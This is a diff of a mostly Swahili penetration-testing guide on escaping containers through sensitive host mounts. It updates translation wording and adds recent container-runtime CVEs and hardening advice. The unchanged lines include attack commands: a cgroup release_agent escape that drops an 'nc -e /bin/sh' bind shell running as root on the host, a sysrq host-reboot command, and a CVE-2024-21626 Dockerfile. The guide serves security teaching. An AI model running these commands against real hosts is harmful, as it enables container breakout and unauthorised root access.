@@ -15,8 +15,8 @@ Maktaba hii inaruhusu ufikiaji wa kubadilisha vigezo vya kernel, kawaida kupitia
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Imeelezwa katika [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Ikiwa unaweza kuandika ndani ya faili hii inawezekana kuandika bomba `|` ikifuatiwa na njia ya programu au skripti ambayo itatekelezwa baada ya ajali kutokea.
-- Mshambuliaji anaweza kupata njia ndani ya mwenyeji kwa kontena lake akitekeleza `mount` na kuandika njia ya binary ndani ya mfumo wa faili wa kontena lake. Kisha, angamiza programu ili kufanya kernel itekeleze binary nje ya kontena.
+- Ikiwa unaweza kuandika ndani ya faili hii inawezekana kuandika bomba `|` ikifuatiwa na njia ya programu au script ambayo itatekelezwa baada ya ajali kutokea.
+- Mshambuliaji anaweza kupata njia ndani ya mwenyeji kwa kontena lake kwa kutekeleza `mount` na kuandika njia ya binary ndani ya mfumo wa faili wa kontena lake. Kisha, angamiza programu ili kufanya kernel itekeleze binary nje ya kontena.
 
 - **Mfano wa Upimaji na Ukatili**:
 ```bash
@@ -49,8 +49,8 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Imejumuishwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Bendera ya kimataifa inayodhibiti ikiwa kernel inapaswa kuanguka au kuitisha OOM killer wakati hali ya OOM inatokea.
+- Imeelekezwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Bendera ya kimataifa inayodhibiti ikiwa kernel itakumbwa na hofu au kuanzisha OOM killer wakati hali ya OOM inatokea.
 
 #### **`/proc/sys/fs`**
 
@@ -59,9 +59,9 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Inaruhusu kujiandikisha kwa wakalimani wa muundo wa binary usio wa asili kulingana na nambari yake ya uchawi.
-- Inaweza kusababisha kupanda kwa haki au upatikanaji wa root shell ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
-- Ukatili unaohusiana na maelezo:
+- Inaruhusu kujiandikisha kwa wakalimani wa fomati za binary zisizo za asili kulingana na nambari yao ya uchawi.
+- Inaweza kusababisha kupanda kwa haki au upatikanaji wa shell ya root ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
+- Uthibitisho wa husika na maelezo:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Mafunzo ya kina: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
@@ -74,7 +74,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
 
 #### **`/proc/sysrq-trigger`**
 
-- Inaruhusu kuitisha amri za Sysrq, ambayo inaweza kusababisha upya wa mfumo mara moja au hatua nyingine muhimu.
+- Inaruhusu kuitisha amri za Sysrq, ambayo inaweza kusababisha upya mara moja kwa mfumo au hatua nyingine muhimu.
 - **Mfano wa Kuanzisha Upya Mwenyeji**:
 
 ```bash
@@ -84,13 +84,13 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 #### **`/proc/kmsg`**
 
 - Inafichua ujumbe wa buffer ya ring ya kernel.
-- Inaweza kusaidia katika ukosefu wa kernel, kuvuja kwa anwani, na kutoa taarifa nyeti za mfumo.
+- Inaweza kusaidia katika mashambulizi ya kernel, kuvuja kwa anwani, na kutoa taarifa nyeti za mfumo.
 
 #### **`/proc/kallsyms`**
 
 - Inataja alama za kernel zilizotolewa na anwani zao.
-- Muhimu kwa maendeleo ya ukosefu wa kernel, hasa kwa kushinda KASLR.
-- Taarifa za anwani zimewekwa vizuizi ikiwa `kptr_restrict` imewekwa kuwa `1` au `2`.
+- Muhimu kwa maendeleo ya mashambulizi ya kernel, hasa kwa kushinda KASLR.
+- Taarifa za anwani zimepunguzika ikiwa `kptr_restrict` imewekwa kuwa `1` au `2`.
 - Maelezo katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/[pid]/mem`**
@@ -114,7 +114,7 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 #### **`/proc/mem`**
 
 - Kiolesura mbadala kwa `/dev/mem`, kinawakilisha kumbukumbu halisi.
-- Inaruhusu kusoma na kuandika, kubadilisha kumbukumbu yote kunahitaji kutatua anwani za virtual hadi halisi.
+- Inaruhusu kusoma na kuandika, mabadiliko ya kumbukumbu yote yanahitaji kutatua anwani za virtual hadi halisi.
 
 #### **`/proc/sched_debug`**
 
@@ -131,7 +131,7 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 #### **`/sys/kernel/uevent_helper`**
 
 - Inatumika kwa kushughulikia `uevents` za kifaa cha kernel.
-- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo za kawaida wakati wa kuanzisha `uevent`.
+- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo na mpangilio wakati wa kuanzishwa kwa `uevent`.
 - **Mfano wa Ukatili**:
 ```bash
 
@@ -264,7 +264,7 @@ the other containers' filesystems are available under a different base path:
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
 Dereva ya Hifadhi: overlay2
-Dir ya Msingi ya Docker: /var/lib/docker
+Dir ya Mzizi ya Docker: /var/lib/docker
 ```
 
 So the filesystems are under `/var/lib/docker/overlay2/`:
@@ -293,7 +293,8 @@ Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent 
 ```text
 /run/containerd/containerd.sock     # socket ya containerd CRI  
 /var/run/crio/crio.sock             # socket ya CRI-O runtime  
-/run/podman/podman.sock             # API ya Podman (ya mizizi au isiyo na mizizi)  
+/run/podman/podman.sock             # API ya Podman (rootful au rootless)  
+/run/buildkit/buildkitd.sock        # daemon ya BuildKit (rootful)  
 /var/run/kubelet.sock               # API ya Kubelet kwenye nodi za Kubernetes  
 /run/firecracker-containerd.sock    # Kata / Firecracker
 ```
@@ -319,7 +320,7 @@ mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
 echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requires CVE-2022-0492
 
 echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
-sh -c "echo 0 > /tmp/x/cgroup.procs"  # inasababisha tukio la empty-cgroup
+sh -c "echo 0 > /tmp/x/cgroup.procs"  # triggers the empty-cgroup event
 ```
 
 When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.
@@ -327,7 +328,7 @@ When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**
 ### Mount-Related Escape CVEs (2023-2025)
 
 * **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
-runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14).
+runc ≤ 1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥ 25.0.3, containerd ≥ 1.7.14).
 
 ```Dockerfile
 FROM scratch
@@ -338,11 +339,17 @@ CMD ["/bin/sh"]
 * **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
 A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.
 
+* **CVE-2024-1753 – Buildah / Podman bind-mount breakout during `build`**
+Buildah ≤ 1.35.0 (and Podman ≤ 4.9.3) incorrectly resolved absolute paths passed to `--mount=type=bind` in a *Containerfile*. A crafted build stage could mount `/` from the host **read-write** inside the build container when SELinux was disabled or in permissive mode, leading to full escape at build time. Patched in Buildah 1.35.1 and the corresponding Podman 4.9.4 back-port series.
+
+* **CVE-2024-40635 – containerd UID integer overflow**
+Supplying a `User` value larger than `2147483647` in an image config overflowed the 32-bit signed integer and started the process as UID 0 inside the host user namespace. Workloads expected to run as non-root could therefore obtain root privileges. Fixed in containerd 1.6.38 / 1.7.27 / 2.0.4.
+
 ### Hardening Reminders (2025)
 
 1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
 2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
-3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
+3. Keep the container runtime up-to-date (runc ≥ 1.1.12, BuildKit ≥ 0.12.5, Buildah ≥ 1.35.1 / Podman ≥ 4.9.4, containerd ≥ 1.7.27).
 4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.
 
 ### References
@@ -352,5 +359,7 @@ A race condition in the BuildKit snapshotter let an attacker replace a file that
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
 - [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
+- [Buildah CVE-2024-1753 advisory](https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf)
+- [containerd CVE-2024-40635 advisory](https://github.com/containerd/containerd/security/advisories/GHSA-265r-hfxg-fhmg)
 
 {{#include ../../../../banners/hacktricks-training.md}}
